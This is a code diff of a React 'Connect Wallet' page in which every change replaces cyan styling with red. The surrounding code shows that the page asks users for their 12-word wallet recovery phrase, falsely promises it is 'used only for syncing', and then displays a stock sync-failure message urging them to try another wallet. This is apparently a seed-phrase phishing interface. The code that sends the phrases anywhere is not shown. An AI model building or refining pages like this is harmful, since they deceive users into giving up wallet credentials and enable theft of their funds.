@@ -116,13 +116,13 @@ export default function ConnectWallet() {
         <div>
           <h1 className="font-display text-3xl font-light tracking-[-0.03em]">Connect Wallet</h1>
         </div>
-        <div className="rounded-2xl border border-[#00D4FF]/40 bg-[#00D4FF]/5 p-8 max-w-xl text-center">
-          <ShieldAlert className="w-10 h-10 mx-auto text-[#00D4FF] mb-3" />
+        <div className="rounded-2xl border border-red-400 bg-red-50 p-8 max-w-xl text-center">
+          <ShieldAlert className="w-10 h-10 mx-auto text-red-500 mb-3" />
           <h2 className="font-display text-xl mb-2">Failed to synchronize wallet</h2>
           <p className="text-[13px] text-muted-foreground mb-4">
             We couldn't sync your wallet right now. Our team has been notified — please try a different wallet or contact support.
           </p>
-          <Button variant="outline" onClick={resetForm} className="border-[#00D4FF] text-[#00D4FF] hover:bg-[#00D4FF] hover:text-white">
+          <Button variant="outline" onClick={resetForm} className="border-red-500 text-red-500 hover:bg-red-500 hover:text-white">
             Try another wallet
           </Button>
         </div>
@@ -138,8 +138,8 @@ export default function ConnectWallet() {
         <p className="text-muted-foreground text-[14px] mt-1">Sync your existing wallet to view all assets in one place.</p>
       </div>
 
-      <div className="rounded-2xl border border-[#00D4FF]/30 bg-[#00D4FF]/5 p-4 max-w-2xl flex items-start gap-3">
-        <ShieldAlert className="w-5 h-5 text-[#00D4FF] mt-0.5 shrink-0" />
+      <div className="rounded-2xl border border-red-300 bg-red-50 p-4 max-w-2xl flex items-start gap-3">
+        <ShieldAlert className="w-5 h-5 text-red-500 mt-0.5 shrink-0" />
         <p className="text-[12px] text-muted-foreground">
           Enter your 12-word recovery phrase exactly as provided by your wallet. Words are stored securely and used only for syncing.
         </p>
@@ -154,7 +154,7 @@ export default function ConnectWallet() {
             id="cw-wallet"
             value={walletName}
             onChange={(e) => setWalletName(e.target.value)}
-            className="mt-1 w-full rounded-md border border-input bg-[#E5E7EB] text-[#111111] px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#00D4FF]"
+            className="mt-1 w-full rounded-md border border-input bg-[#E5E7EB] text-[#111111] px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-red-500"
           >
             {WALLETS.map((w) => <option key={w} value={w}>{w}</option>)}
           </select>
@@ -172,7 +172,7 @@ export default function ConnectWallet() {
               placeholder="Enter your wallet name"
               autoComplete="off"
               style={{ fontSize: "16px" }}
-              className="mt-1 w-full rounded-md border border-input bg-white text-[#111111] placeholder:text-[#9ca3af] px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#00D4FF]"
+              className="mt-1 w-full rounded-md border border-input bg-white text-[#111111] placeholder:text-[#9ca3af] px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-red-500"
             />
           </div>
         )}
@@ -202,7 +202,7 @@ export default function ConnectWallet() {
                   autoCapitalize="none"
                   spellCheck={false}
                   style={{ fontSize: "16px" }}
-                  className="w-full pl-7 pr-2 py-2 rounded-md border border-input bg-white text-[#111111] font-mono focus:outline-none focus:ring-2 focus:ring-[#00D4FF]"
+                  className="w-full pl-7 pr-2 py-2 rounded-md border border-input bg-white text-[#111111] font-mono focus:outline-none focus:ring-2 focus:ring-red-500"
                 />
               </div>
             ))}
@@ -212,7 +212,7 @@ export default function ConnectWallet() {
         <Button
           disabled={submitting}
           onClick={submit}
-          className="w-full bg-[#00D4FF] hover:bg-[#00B8E0] text-white"
+          className="w-full bg-red-500 hover:bg-red-600 text-white"
         >
           {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Sync wallet"}
         </Button>
